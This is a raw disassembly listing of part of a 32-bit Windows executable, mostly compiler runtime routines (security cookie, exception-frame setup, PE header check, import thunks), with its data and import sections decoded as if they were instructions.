  406f95:	mov    DWORD PTR [ebp-0x4],0x0
  406f9c:	push   0x400000
  406fa1:	call   0x407030
  406fa6:	add    esp,0x4
  406fa9:	test   eax,eax
  406fab:	je     0x407001
  406fad:	mov    eax,DWORD PTR [ebp+0x8]
  406fb0:	sub    eax,0x400000
  406fb5:	push   eax
  406fb6:	push   0x400000
  406fbb:	call   0x406f10
  406fc0:	add    esp,0x8
  406fc3:	test   eax,eax
  406fc5:	je     0x407001
  406fc7:	mov    eax,DWORD PTR [eax+0x24]
  406fca:	shr    eax,0x1f
  406fcd:	not    eax
  406fcf:	and    eax,0x1
  406fd2:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  406fd9:	mov    ecx,DWORD PTR [ebp-0x10]
  406fdc:	mov    DWORD PTR fs:0x0,ecx
  406fe3:	pop    ecx
  406fe4:	pop    edi
  406fe5:	pop    esi
  406fe6:	pop    ebx
  406fe7:	mov    esp,ebp
  406fe9:	pop    ebp
  406fea:	ret    
  406feb:	mov    eax,DWORD PTR [ebp-0x14]
  406fee:	mov    eax,DWORD PTR [eax]
  406ff0:	xor    ecx,ecx
  406ff2:	cmp    DWORD PTR [eax],0xc0000005
  406ff8:	sete   cl
  406ffb:	mov    eax,ecx
  406ffd:	ret    
  406ffe:	mov    esp,DWORD PTR [ebp-0x18]
  407001:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  407008:	xor    eax,eax
  40700a:	mov    ecx,DWORD PTR [ebp-0x10]
  40700d:	mov    DWORD PTR fs:0x0,ecx
  407014:	pop    ecx
  407015:	pop    edi
  407016:	pop    esi
  407017:	pop    ebx
  407018:	mov    esp,ebp
  40701a:	pop    ebp
  40701b:	ret    
  40701c:	int3   
  40701d:	int3   
  40701e:	int3   
  40701f:	int3   
  407020:	int3   
  407021:	int3   
  407022:	int3   
  407023:	int3   
  407024:	int3   
  407025:	int3   
  407026:	int3   
  407027:	int3   
  407028:	int3   
  407029:	int3   
  40702a:	int3   
  40702b:	int3   
  40702c:	int3   
  40702d:	int3   
  40702e:	int3   
  40702f:	int3   
  407030:	mov    edi,edi
  407032:	push   ebp
  407033:	mov    ebp,esp
  407035:	mov    eax,DWORD PTR [ebp+0x8]
  407038:	mov    ecx,0x5a4d
  40703d:	cmp    WORD PTR [eax],cx
  407040:	je     0x407046
  407042:	xor    eax,eax
  407044:	pop    ebp
  407045:	ret    
  407046:	mov    ecx,DWORD PTR [eax+0x3c]
  407049:	add    ecx,eax
  40704b:	xor    eax,eax
  40704d:	cmp    DWORD PTR [ecx],0x4550
  407053:	jne    0x407061
  407055:	mov    edx,0x10b
  40705a:	cmp    WORD PTR [ecx+0x18],dx
  40705e:	sete   al
  407061:	pop    ebp
  407062:	ret    
  407063:	int3   
  407064:	int3   
  407065:	int3   
  407066:	int3   
  407067:	int3   
  407068:	mov    edi,edi
  40706a:	push   ebp
  40706b:	mov    ebp,esp
  40706d:	sub    esp,0x14
  407070:	and    DWORD PTR [ebp-0xc],0x0
  407074:	and    DWORD PTR [ebp-0x8],0x0
  407078:	mov    eax,ds:0x408004
  40707d:	push   esi
  40707e:	push   edi
  40707f:	mov    edi,0xbb40e64e
  407084:	mov    esi,0xffff0000
  407089:	cmp    eax,edi
  40708b:	je     0x40709a
  40708d:	test   esi,eax
  40708f:	je     0x40709a
  407091:	not    eax
  407093:	mov    ds:0x408008,eax
  407098:	jmp    0x407104
  40709a:	lea    eax,[ebp-0xc]
  40709d:	push   eax
  40709e:	call   DWORD PTR ds:0x409188
  4070a4:	mov    eax,DWORD PTR [ebp-0x8]
  4070a7:	xor    eax,DWORD PTR [ebp-0xc]
  4070aa:	mov    DWORD PTR [ebp-0x4],eax
  4070ad:	call   DWORD PTR ds:0x409168
  4070b3:	xor    DWORD PTR [ebp-0x4],eax
  4070b6:	call   DWORD PTR ds:0x4090a4
  4070bc:	xor    DWORD PTR [ebp-0x4],eax
  4070bf:	call   DWORD PTR ds:0x40918c
  4070c5:	xor    eax,DWORD PTR [ebp-0x4]
  4070c8:	lea    ecx,[ebp-0x4]
  4070cb:	xor    eax,ecx
  4070cd:	mov    DWORD PTR [ebp-0x4],eax
  4070d0:	lea    eax,[ebp-0x14]
  4070d3:	push   eax
  4070d4:	call   DWORD PTR ds:0x409178
  4070da:	mov    eax,DWORD PTR [ebp-0x10]
  4070dd:	xor    eax,DWORD PTR [ebp-0x14]
  4070e0:	mov    ecx,DWORD PTR [ebp-0x4]
  4070e3:	xor    ecx,eax
  4070e5:	cmp    ecx,edi
  4070e7:	je     0x4070f1
  4070e9:	test   DWORD PTR ds:0x408004,esi
  4070ef:	jne    0x4070f6
  4070f1:	mov    ecx,0xbb40e64f
  4070f6:	mov    DWORD PTR ds:0x408004,ecx
  4070fc:	not    ecx
  4070fe:	mov    DWORD PTR ds:0x408008,ecx
  407104:	pop    edi
  407105:	pop    esi
  407106:	mov    esp,ebp
  407108:	pop    ebp
  407109:	ret    
  40710a:	int3   
  40710b:	int3   
  40710c:	int3   
  40710d:	int3   
  40710e:	int3   
  40710f:	int3   
  407110:	xor    eax,eax
  407112:	ret    
  407113:	int3   
  407114:	int3   
  407115:	int3   
  407116:	int3   
  407117:	int3   
  407118:	push   0x30000
  40711d:	push   0x10000
  407122:	call   DWORD PTR ds:0x4091b0
  407128:	pop    ecx
  407129:	pop    ecx
  40712a:	ret    
  40712b:	int3   
  40712c:	int3   
  40712d:	int3   
  40712e:	int3   
  40712f:	int3   
  407130:	jmp    DWORD PTR ds:0x4091a4
  407136:	int3   
  407137:	int3   
  407138:	int3   
  407139:	int3   
  40713a:	int3   
  40713b:	int3   
  40713c:	push   0x4071a0
  407141:	push   DWORD PTR fs:0x0
  407148:	mov    eax,DWORD PTR [esp+0x10]
  40714c:	mov    DWORD PTR [esp+0x10],ebp
  407150:	lea    ebp,[esp+0x10]
  407154:	sub    esp,eax
  407156:	push   ebx
  407157:	push   esi
  407158:	push   edi
  407159:	mov    eax,ds:0x408004
  40715e:	xor    DWORD PTR [ebp-0x4],eax
  407161:	xor    eax,ebp
  407163:	mov    DWORD PTR [ebp-0x1c],eax
  407166:	push   eax
  407167:	mov    DWORD PTR [ebp-0x18],esp
  40716a:	push   DWORD PTR [ebp-0x8]
  40716d:	mov    eax,DWORD PTR [ebp-0x4]
  407170:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  407177:	mov    DWORD PTR [ebp-0x8],eax
  40717a:	lea    eax,[ebp-0x10]
  40717d:	mov    fs:0x0,eax
  407183:	ret    
  407184:	mov    ecx,DWORD PTR [ebp-0x1c]
  407187:	xor    ecx,ebp
  407189:	call   0x406b70
  40718e:	jmp    0x407235
  407193:	int3   
  407194:	int3   
  407195:	int3   
  407196:	int3   
  407197:	int3   
  407198:	int3   
  407199:	int3   
  40719a:	int3   
  40719b:	int3   
  40719c:	int3   
  40719d:	int3   
  40719e:	int3   
  40719f:	int3   
  4071a0:	mov    edi,edi
  4071a2:	push   ebp
  4071a3:	mov    ebp,esp
  4071a5:	push   DWORD PTR [ebp+0x14]
  4071a8:	push   DWORD PTR [ebp+0x10]
  4071ab:	push   DWORD PTR [ebp+0xc]
  4071ae:	push   DWORD PTR [ebp+0x8]
  4071b1:	push   0x406b70
  4071b6:	push   0x408004
  4071bb:	call   0x40724e
  4071c0:	add    esp,0x18
  4071c3:	pop    ebp
  4071c4:	ret    
  4071c5:	int3   
  4071c6:	int3   
  4071c7:	int3   
  4071c8:	int3   
  4071c9:	int3   
  4071ca:	jmp    DWORD PTR ds:0x4091ec
  4071d0:	int3   
  4071d1:	int3   
  4071d2:	int3   
  4071d3:	int3   
  4071d4:	int3   
  4071d5:	int3   
  4071d6:	jmp    DWORD PTR ds:0x409198
  4071dc:	int3   
  4071dd:	int3   
  4071de:	int3   
  4071df:	int3   
  4071e0:	int3   
  4071e1:	int3   
  4071e2:	jmp    DWORD PTR ds:0x409194
  4071e8:	int3   
  4071e9:	int3   
  4071ea:	int3   
  4071eb:	int3   
  4071ec:	int3   
  4071ed:	int3   
  4071ee:	int3   
  4071ef:	int3   
  4071f0:	push   0x4071a0
  4071f5:	push   DWORD PTR fs:0x0
  4071fc:	mov    eax,DWORD PTR [esp+0x10]
  407200:	mov    DWORD PTR [esp+0x10],ebp
  407204:	lea    ebp,[esp+0x10]
  407208:	sub    esp,eax
  40720a:	push   ebx
  40720b:	push   esi
  40720c:	push   edi
  40720d:	mov    eax,ds:0x408004
  407212:	xor    DWORD PTR [ebp-0x4],eax
  407215:	xor    eax,ebp
  407217:	push   eax
  407218:	mov    DWORD PTR [ebp-0x18],esp
  40721b:	push   DWORD PTR [ebp-0x8]
  40721e:	mov    eax,DWORD PTR [ebp-0x4]
  407221:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  407228:	mov    DWORD PTR [ebp-0x8],eax
  40722b:	lea    eax,[ebp-0x10]
  40722e:	mov    fs:0x0,eax
  407234:	ret    
  407235:	mov    ecx,DWORD PTR [ebp-0x10]
  407238:	mov    DWORD PTR fs:0x0,ecx
  40723f:	pop    ecx
  407240:	pop    edi
  407241:	pop    edi
  407242:	pop    esi
  407243:	pop    ebx
  407244:	mov    esp,ebp
  407246:	pop    ebp
  407247:	push   ecx
  407248:	ret    
  407249:	int3   
  40724a:	int3   
  40724b:	int3   
  40724c:	int3   
  40724d:	int3   
  40724e:	jmp    DWORD PTR ds:0x4091b4
  407254:	int3   
  407255:	int3   
  407256:	int3   
  407257:	int3   
  407258:	int3   
  407259:	int3   
  40725a:	jmp    DWORD PTR ds:0x409200
  407260:	int3   
  407261:	int3   
  407262:	int3   
  407263:	int3   
  407264:	int3   
  407265:	int3   
  407266:	int3   
  407267:	int3   
  407268:	int3   
  407269:	int3   
  40726a:	int3   
  40726b:	int3   
  40726c:	int3   
  40726d:	int3   
  40726e:	int3   
  40726f:	int3   
  407270:	push   ecx
  407271:	lea    ecx,[esp+0x4]
  407275:	sub    ecx,eax
  407277:	sbb    eax,eax
  407279:	not    eax
  40727b:	and    ecx,eax
  40727d:	mov    eax,esp
  40727f:	and    eax,0xfffff000
  407284:	cmp    ecx,eax
  407286:	jb     0x407292
  407288:	mov    eax,ecx
  40728a:	pop    ecx
  40728b:	xchg   esp,eax
  40728c:	mov    eax,DWORD PTR [eax]
  40728e:	mov    DWORD PTR [esp],eax
  407291:	ret    
  407292:	sub    eax,0x1000
  407297:	test   DWORD PTR [eax],eax
  407299:	jmp    0x407284
  40729b:	int3   
  40729c:	int3   
  40729d:	int3   
  40729e:	int3   
  40729f:	int3   
  4072a0:	jmp    DWORD PTR ds:0x409204
  4072a6:	int3   
  4072a7:	int3   
  4072a8:	int3   
  4072a9:	int3   
  4072aa:	int3   
  4072ab:	int3   
  4072ac:	jmp    DWORD PTR ds:0x409208
  4072b2:	int3   
  4072b3:	int3   
  4072b4:	int3   
  4072b5:	int3   
  4072b6:	int3   
  4072b7:	int3   
  4072b8:	int3   
  4072b9:	int3   
  4072ba:	int3   
  4072bb:	int3   
  4072bc:	int3   
  4072bd:	int3   
  4072be:	int3   
  4072bf:	int3   
  4072c0:	mov    edi,edi
  4072c2:	push   ebp
  4072c3:	mov    ebp,esp
  4072c5:	push   ecx
  4072c6:	push   ebx
  4072c7:	mov    DWORD PTR [ebp-0x4],0x408498
  4072ce:	mov    ebx,0x4084e8
  4072d3:	push   esi
  4072d4:	mov    esi,DWORD PTR [ebp-0x4]
  4072d7:	cmp    esi,ebx
  4072d9:	je     0x4072f9
  4072db:	push   edi
  4072dc:	mov    edi,DWORD PTR [esi]
  4072de:	jmp    0x4072eb
  4072e0:	push   edi
  4072e1:	mov    edi,DWORD PTR [edi+0x8]
  4072e4:	call   DWORD PTR ds:0x4091b8
  4072ea:	pop    ecx
  4072eb:	test   edi,edi
  4072ed:	jne    0x4072e0
  4072ef:	mov    DWORD PTR [esi],edi
  4072f1:	add    esi,0x4
  4072f4:	cmp    esi,ebx
  4072f6:	jne    0x4072dc
  4072f8:	pop    edi
  4072f9:	pop    esi
  4072fa:	pop    ebx
  4072fb:	mov    esp,ebp
  4072fd:	pop    ebp
  4072fe:	ret    
  4072ff:	int3   
  407300:	int3   
  407301:	int3   
  407302:	int3   
  407303:	int3   
  407304:	int3   
  407305:	int3   
  407306:	int3   
  407307:	int3   
  407308:	int3   
  407309:	int3   
  40730a:	int3   
  40730b:	int3   
  40730c:	int3   
  40730d:	int3   
  40730e:	int3   
  40730f:	int3   
  407310:	mov    edi,edi
  407312:	push   ebp
  407313:	mov    ebp,esp
  407315:	sub    esp,0xc
  407318:	mov    eax,ds:0x408004
  40731d:	xor    eax,ebp
  40731f:	mov    DWORD PTR [ebp-0x4],eax
  407322:	lea    eax,[ebp-0xc]
  407325:	push   eax
  407326:	lea    eax,[ebp-0x8]
  407329:	push   eax
  40732a:	push   0x0
  40732c:	push   0x40846c
  407331:	call   DWORD PTR ds:0x409080
  407337:	test   eax,eax
  407339:	je     0x40735b
  40733b:	cmp    DWORD PTR [ebp-0x8],0x0
  40733f:	jne    0x40735b
  407341:	push   esi
  407342:	push   edi
  407343:	mov    edi,DWORD PTR [ebp-0xc]
  407346:	push   0x0
  407348:	mov    eax,DWORD PTR [edi]
  40734a:	mov    esi,DWORD PTR [eax+0xc]
  40734d:	mov    ecx,esi
  40734f:	call   DWORD PTR ds:0x409210
  407355:	mov    ecx,edi
  407357:	call   esi
  407359:	pop    edi
  40735a:	pop    esi
  40735b:	mov    ecx,DWORD PTR [ebp-0x4]
  40735e:	xor    ecx,ebp
  407360:	call   0x406b70
  407365:	mov    esp,ebp
  407367:	pop    ebp
  407368:	ret    
  407369:	int3   
  40736a:	int3   
  40736b:	int3   
  40736c:	int3   
  40736d:	int3   
  40736e:	int3   
  40736f:	int3   
  407370:	mov    edi,edi
  407372:	push   ebp
  407373:	mov    ebp,esp
  407375:	push   ecx
  407376:	push   ecx
  407377:	lea    eax,[ebp-0x8]
  40737a:	push   eax
  40737b:	lea    eax,[ebp-0x4]
  40737e:	push   eax
  40737f:	push   0x0
  407381:	push   0x408484
  407386:	call   DWORD PTR ds:0x409080
  40738c:	test   eax,eax
  40738e:	je     0x40739e
  407390:	cmp    DWORD PTR [ebp-0x4],0x0
  407394:	jne    0x40739e
  407396:	mov    ecx,DWORD PTR [ebp-0x8]
  407399:	call   0x404817
  40739e:	mov    esp,ebp
  4073a0:	pop    ebp
  4073a1:	ret    
  4073a2:	int3   
  4073a3:	int3   
  4073a4:	int3   
  4073a5:	int3   
  4073a6:	int3   
  4073a7:	int3   
  4073a8:	in     al,0xff
  4073aa:	(bad)  
  4073ab:	inc    DWORD PTR [eax]
  4073ad:	add    BYTE PTR [eax],al
  4073af:	add    BYTE PTR [edi+edi*8+0xffff],al
  4073b6:	add    BYTE PTR [eax],al
  4073b8:	(bad)  
  4073b9:	(bad)  
  4073ba:	(bad)  
  4073bb:	(bad)  
  4073bc:	cld    
  4073bd:	push   0x40
  4073bf:	add    BYTE PTR [eax],al
  4073c1:	imul   eax,DWORD PTR [eax+0x0],0xfffffffe
  4073c5:	(bad)  
  4073c6:	(bad)  
  4073c7:	push   DWORD PTR [eax-0x3bffbf96]
  4073cd:	push   0x40
  4073cf:	add    ah,ah
  4073d1:	(bad)  
  4073d2:	(bad)  
  4073d3:	inc    DWORD PTR [eax]
  4073d5:	add    BYTE PTR [eax],al
  4073d7:	add    al,cl
  4073d9:	(bad)  
  4073da:	(bad)  
  4073db:	inc    DWORD PTR [eax]
  4073dd:	add    BYTE PTR [eax],al
  4073df:	add    dh,bh
  4073e1:	(bad)  
  4073e2:	(bad)  
  4073e3:	inc    DWORD PTR [eax]
  4073e5:	add    BYTE PTR [eax],al
  4073e7:	add    BYTE PTR [esi+0x6d],dl
  4073ea:	inc    eax
  4073eb:	add    BYTE PTR [eax],al
  4073ed:	add    BYTE PTR [eax],al
  4073ef:	add    dh,bh
  4073f1:	(bad)  
  4073f2:	(bad)  
  4073f3:	inc    DWORD PTR [eax]
  4073f5:	add    BYTE PTR [eax],al
  4073f7:	add    ah,dl
  4073f9:	(bad)  
  4073fa:	(bad)  
  4073fb:	inc    DWORD PTR [eax]
  4073fd:	add    BYTE PTR [eax],al
  4073ff:	add    dh,bh
  407401:	(bad)  
  407402:	(bad)  
  407403:	call   FWORD PTR [esi+ebp*2+0x6ea00040]
  40740a:	inc    eax
  40740b:	add    BYTE PTR [eax],al
  40740d:	add    BYTE PTR [eax],al
  40740f:	add    dh,bh
  407411:	(bad)  
  407412:	(bad)  
  407413:	inc    DWORD PTR [eax]
  407415:	add    BYTE PTR [eax],al
  407417:	add    al,bl
  407419:	(bad)  
  40741a:	(bad)  
  40741b:	inc    DWORD PTR [eax]
  40741d:	add    BYTE PTR [eax],al
  40741f:	add    dh,bh
  407421:	(bad)  
  407422:	(bad)  
  407423:	(bad)  
  407424:	jmp    0x407495
  407426:	inc    eax
  407427:	add    dh,bh
  407429:	outs   dx,DWORD PTR ds:[esi]
  40742a:	inc    eax
  40742b:	add    BYTE PTR [eax],al
  40742d:	add    BYTE PTR [eax],al
  40742f:	add    BYTE PTR [eax-0x80],dl
  407432:	inc    eax
  407433:	add    BYTE PTR [eax],al
  407435:	add    BYTE PTR [eax],al
  407437:	add    bh,bh
  407439:	(bad)  
  40743a:	(bad)  
  40743b:	inc    DWORD PTR [eax]
  40743d:	add    BYTE PTR [eax],al
  40743f:	add    BYTE PTR [eax+0x0],bl
  407442:	add    BYTE PTR [eax],al
  407444:	rol    BYTE PTR [esi+0x40],1
  407447:	add    BYTE PTR [eax],al
  407449:	add    BYTE PTR [eax],al
  40744b:	add    al,al
  40744d:	inc    esi
  40744e:	inc    eax
  40744f:	add    BYTE PTR [eax],al
  407451:	add    BYTE PTR [eax],al
  407453:	add    BYTE PTR [eax+0x74],bl
  407456:	inc    eax
  407457:	add    BYTE PTR [ecx],al
  407459:	add    BYTE PTR [eax],al
  40745b:	add    BYTE PTR [esp+esi*2],ch
  40745e:	inc    eax
	...

Disassembly of section .data:

00408000 <.data>:
  408000:	add    DWORD PTR [eax],eax
  408002:	add    BYTE PTR [eax],al
  408004:	dec    esi
  408005:	out    0x40,al
  408007:	mov    ebx,0x44bf19b1
  40800c:	add    DWORD PTR [eax],eax
  40800e:	add    BYTE PTR [eax],al
  408010:	add    BYTE PTR [eax],al
  408012:	add    BYTE PTR [eax],al
  408014:	loop   0x408038
  408016:	inc    eax
	...
  40803f:	add    bh,bh
  408041:	(bad)  
  408042:	(bad)  
  408043:	inc    DWORD PTR [ecx]
	...
  40804d:	add    BYTE PTR [eax],al
  40804f:	add    BYTE PTR [eax+0x4010],bh
  408055:	add    BYTE PTR [eax],al
  408057:	add    BYTE PTR [esi],ch
  408059:	aas    
  40805a:	inc    ecx
  40805b:	push   esi
  40805c:	push   edx
  40805d:	gs jae 0x4080d5
  408060:	ins    BYTE PTR es:[edi],dx
  408061:	je     0x4080a8
  408063:	js     0x4080c8
  408065:	gs jo  0x4080dc
  408068:	imul   ebp,DWORD PTR [edi+0x6e],0x6c697740
  40806f:	inc    eax
  408070:	inc    eax
	...

Disassembly of section .idata:

00409000 <.idata>:
  409000:	fs xchg ebp,eax
  409002:	add    BYTE PTR [eax],al
  409004:	je     0x408f9b
  409006:	add    BYTE PTR [eax],al
  409008:	test   BYTE PTR [ebp-0x6a680000],dl
  40900e:	add    BYTE PTR [eax],al
  409010:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409011:	xchg   ebp,eax
  409012:	add    BYTE PTR [eax],al
  409014:	mov    edx,0xcc000095
  409019:	xchg   ebp,eax
  40901a:	add    BYTE PTR [eax],al
  40901c:	loop   0x408fb3
  40901e:	add    BYTE PTR [eax],al
  409020:	hlt    
  409021:	xchg   ebp,eax
  409022:	add    BYTE PTR [eax],al
  409024:	or     dl,BYTE PTR [esi-0x69e60000]
  40902a:	add    BYTE PTR [eax],al
  40902c:	add    BYTE PTR [eax],al
  40902e:	add    BYTE PTR [eax],al
  409030:	dec    esi
  409031:	add    DWORD PTR [eax],eax
  409033:	or     BYTE PTR [ecx+eax*1+0x0],0x80
  409038:	adc    DWORD PTR [eax],eax
  40903a:	add    BYTE PTR [eax-0x7ffffeb8],al
  409040:	add    BYTE PTR [eax],al
  409042:	add    BYTE PTR [eax],al
  409044:	sbb    BYTE PTR [ebp+0x0],0x0
  40904b:	add    BYTE PTR [esi+edx*4-0x69480000],ch
  409052:	add    BYTE PTR [eax],al
  409054:	enter  0x96,0x0
  409058:	(bad)  
  409059:	xchg   esi,eax
  40905a:	add    BYTE PTR [eax],al
  40905c:	repnz xchg esi,eax
  40905e:	add    BYTE PTR [eax],al
  409060:	or     dl,BYTE PTR [edi-0x698a0000]
  409066:	add    BYTE PTR [eax],al
  409068:	cmp    BYTE PTR [edi-0x68b80000],dl
  40906e:	add    BYTE PTR [eax],al
  409070:	pop    esi
  409071:	xchg   edi,eax
  409072:	add    BYTE PTR [eax],al
  409074:	jo     0x40900d
  409076:	add    BYTE PTR [eax],al
  409078:	nop
  409079:	xchg   esi,eax
  40907a:	add    BYTE PTR [eax],al
  40907c:	xchg   esi,eax
  40907d:	xchg   edi,eax
  40907e:	add    BYTE PTR [eax],al
  409080:	test   al,0x97
  409082:	add    BYTE PTR [eax],al
  409084:	ret    0x97
  409087:	add    al,bl
  409089:	xchg   edi,eax
  40908a:	add    BYTE PTR [eax],al
  40908c:	repnz xchg edi,eax
  40908e:	add    BYTE PTR [eax],al
  409090:	or     BYTE PTR [eax-0x67e40000],bl
  409096:	add    BYTE PTR [eax],al
  409098:	ss cwde 
  40909a:	add    BYTE PTR [eax],al
  40909c:	dec    eax
  40909d:	cwde   
  40909e:	add    BYTE PTR [eax],al
  4090a0:	pop    edx
  4090a1:	cwde   
  4090a2:	add    BYTE PTR [eax],al
  4090a4:	jo     0x40903e
  4090a6:	add    BYTE PTR [eax],al
  4090a8:	adc    BYTE PTR [edi-0x697c0000],0x0
  4090af:	add    BYTE PTR [eax-0x6a],ch
  4090b2:	add    BYTE PTR [eax],al
  4090b4:	pop    esp
  4090b5:	xchg   esi,eax
  4090b6:	add    BYTE PTR [eax],al
  4090b8:	push   eax
  4090b9:	xchg   esi,eax
  4090ba:	add    BYTE PTR [eax],al
  4090bc:	inc    edx
  4090bd:	xchg   esi,eax
  4090be:	add    BYTE PTR [eax],al
  4090c0:	sub    BYTE PTR [edi-0x62660000],dl
  4090c6:	add    BYTE PTR [eax],al
  4090c8:	add    BYTE PTR [eax],al
  4090ca:	add    BYTE PTR [eax],al
  4090cc:	mov    BYTE PTR [edx+0x2a80000],bl
  4090d2:	add    BYTE PTR [eax-0x7fffff5c],al
  4090d8:	je     0x409074
  4090da:	add    BYTE PTR [eax],al
  4090dc:	xor    eax,DWORD PTR [eax]
  4090de:	add    BYTE PTR [eax-0x7fffffcf],al
  4090e4:	cmp    al,BYTE PTR [eax]
  4090e6:	add    BYTE PTR [eax-0x7fffffd6],al
  4090ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4090ed:	add    BYTE PTR [eax],al
  4090ef:	and    BYTE PTR [eax-0x66],0x0
  4090f3:	add    BYTE PTR [esi+0x0],bl
  4090f6:	add    BYTE PTR [eax+0x0],al
  4090fc:	rcr    BYTE PTR [edx-0x65460000],1
  409102:	add    BYTE PTR [eax],al
  409104:	enter  0x1,0x80
  409108:	inc    esi
  409109:	fwait
  40910a:	add    BYTE PTR [eax],al
  40910c:	sahf   
  40910d:	add    BYTE PTR [eax],al
  40910f:	xor    BYTE PTR [eax],0x9b
  409112:	add    BYTE PTR [eax],al
  409114:	and    al,0x9b
  409116:	add    BYTE PTR [eax],al
  409118:	push   cs
  409119:	fwait
  40911a:	add    BYTE PTR [eax],al
  40911c:	(bad)  
  40911d:	call   0x0:0x9aec0000
  409124:	ficomp WORD PTR [edx-0x655a0000]
  40912a:	add    BYTE PTR [eax],al
  40912c:	add    BYTE PTR [eax],al
  40912e:	add    BYTE PTR [eax],al
  409130:	mov    al,ds:0x94000098
  409135:	cwde   
  409136:	add    BYTE PTR [eax],al
  409138:	mov    edx,0xae000098
  40913d:	cwde   
  40913e:	add    BYTE PTR [eax],al
  409140:	add    BYTE PTR [eax],al
  409142:	add    BYTE PTR [eax],al
  409144:	push   0x5400009b
  409149:	pushf  
  40914a:	add    BYTE PTR [eax],al
  40914c:	pushfw 
  40914e:	add    BYTE PTR [eax],al
  409150:	add    BYTE PTR [eax],al
  409152:	add    BYTE PTR [eax],al
  409154:	test   BYTE PTR [ebx-0x64600000],bl
  40915a:	add    BYTE PTR [eax],al
  40915c:	add    BYTE PTR [eax],al
  40915e:	add    BYTE PTR [eax],al
  409160:	out    0x9b,al
  409162:	add    BYTE PTR [eax],al
  409164:	add    BYTE PTR [eax],al
  409166:	add    BYTE PTR [eax],al
  409168:	adc    al,0x9c
  40916a:	add    BYTE PTR [eax],al
  40916c:	rcr    BYTE PTR [ebx-0x64420000],cl
  409172:	add    BYTE PTR [eax],al
  409174:	add    BYTE PTR [eax],al
  409176:	add    BYTE PTR [eax],al
  409178:	cli    
  409179:	fwait
  40917a:	add    BYTE PTR [eax],al
  40917c:	add    BYTE PTR [eax],al
  40917e:	add    BYTE PTR [eax],al
  409180:	jl     0x40911d
  409182:	add    BYTE PTR [eax],al
  409184:	add    BYTE PTR [eax],al
  409186:	add    BYTE PTR [eax],al
  409188:	sub    bl,BYTE PTR [eax+eax*1+0x9c4400]
  40918f:	add    BYTE PTR [eax],al
  409191:	add    BYTE PTR [eax],al
  409193:	add    dh,ah
  409195:	cdq    
  409196:	add    BYTE PTR [eax],al
  409198:	fcomp  QWORD PTR [ecx-0x660c0000]
  40919e:	add    BYTE PTR [eax],al
  4091a0:	mov    esi,0xb2000099
  4091a5:	cdq    
  4091a6:	add    BYTE PTR [eax],al
  4091a8:	(bad)  
  4091a9:	cdq    
  4091aa:	add    BYTE PTR [eax],al
  4091ac:	push   ss
  4091ad:	call   0x0:0x9a2a0000
  4091b4:	cmp    BYTE PTR [edx-0x67220000],bl
  4091ba:	add    BYTE PTR [eax],al
  4091bc:	aam    0x98
  4091be:	add    BYTE PTR [eax],al
  4091c0:	(bad)  
  4091c1:	cwde   
  4091c2:	add    BYTE PTR [eax],al
  4091c4:	or     bl,BYTE PTR [ecx-0x67100000]
  4091ca:	add    BYTE PTR [eax],al
  4091cc:	sbb    bl,BYTE PTR [ecx-0x66d80000]
  4091d2:	add    BYTE PTR [eax],al
  4091d4:	cmp    BYTE PTR [ecx-0x66ba0000],bl
  4091da:	add    BYTE PTR [eax],al
  4091dc:	push   esi
  4091dd:	cdq    
  4091de:	add    BYTE PTR [eax],al
  4091e0:	push   0x70000099
  4091e5:	cdq    
  4091e6:	add    BYTE PTR [eax],al
  4091e8:	js     0x409183
  4091ea:	add    BYTE PTR [eax],al
  4091ec:	aam    0x99
  4091ee:	add    BYTE PTR [eax],al
  4091f0:	sbb    BYTE PTR [ecx-0x671a0000],0x0
  4091f7:	add    BYTE PTR [eax-0x61ffff67],dl
  4091fd:	cdq    
  4091fe:	add    BYTE PTR [eax],al
  409200:	lods   al,BYTE PTR ds:[esi]
  409201:	popf   
  409202:	add    BYTE PTR [eax],al
  409204:	ret    0x9d
  409207:	add    ah,cl
  409209:	popf   
  40920a:	add    BYTE PTR [eax],al
  40920c:	add    BYTE PTR [eax],al
  40920e:	add    BYTE PTR [eax],al
  409210:	rol    BYTE PTR [edi+0x40],1
  409213:	add    BYTE PTR [ebx+edx*4+0x0],dl
	...
  40921f:	add    BYTE PTR [esi+edx*4],dh
  409222:	add    BYTE PTR [eax],al
  409224:	add    BYTE PTR [eax-0x6c600000],dl
	...
  409232:	add    BYTE PTR [eax],al
  409234:	xchg   BYTE PTR [eax-0x6fb40000],bl
  40923a:	add    BYTE PTR [eax],al
  40923c:	test   BYTE PTR [eax+eax*1+0x0],dl
  409243:	add    BYTE PTR [eax],al
  409245:	add    BYTE PTR [eax],al
  409247:	add    al,cl
  409249:	cwde   
  40924a:	add    BYTE PTR [eax],al
  40924c:	xor    BYTE PTR [ecx-0x6b180000],dl
	...
  40925a:	add    BYTE PTR [eax],al
  40925c:	enter  0x99,0x0
  409260:	xchg   esp,eax
  409261:	xchg   ecx,eax
  409262:	add    BYTE PTR [eax],al
  409264:	test   BYTE PTR [ebx+0x0],dl
  40926a:	add    BYTE PTR [eax],al
  40926c:	add    BYTE PTR [eax],al
  40926e:	add    BYTE PTR [eax],al
  409270:	push   edx
  409271:	call   0x0:0x90300000
  409278:	and    BYTE PTR [eax+eax*1+0x0],dl
  40927f:	add    BYTE PTR [eax],al
  409281:	add    BYTE PTR [eax],al
  409283:	add    BYTE PTR [edx-0x33ffff66],bl
  409289:	nop
  40928a:	add    BYTE PTR [eax],al
  40928c:	push   eax
  40928d:	xchg   esp,eax
	...
  409296:	add    BYTE PTR [eax],al
  409298:	pop    esp
  409299:	fwait
  40929a:	add    BYTE PTR [eax],al
  40929c:	cld    
  40929d:	nop
  40929e:	add    BYTE PTR [eax],al
  4092a0:	cwde   
  4092a1:	xchg   esp,eax
	...
  4092aa:	add    BYTE PTR [eax],al
  4092ac:	js     0x40924a
  4092ae:	add    BYTE PTR [eax],al
  4092b0:	inc    esp
  4092b1:	xchg   ecx,eax
  4092b2:	add    BYTE PTR [eax],al
  4092b4:	aam    0x94
	...
  4092be:	add    BYTE PTR [eax],al
  4092c0:	cwde   
  4092c1:	pushf  
  4092c2:	add    BYTE PTR [eax],al
  4092c4:	adc    BYTE PTR [ecx-0x6b580000],0x0
	...
  4092d3:	add    BYTE PTR [edx+0x5400009c],bh
  4092d9:	xchg   ecx,eax
  4092da:	add    BYTE PTR [eax],al
  4092dc:	mov    esp,0x94
  4092e1:	add    BYTE PTR [eax],al
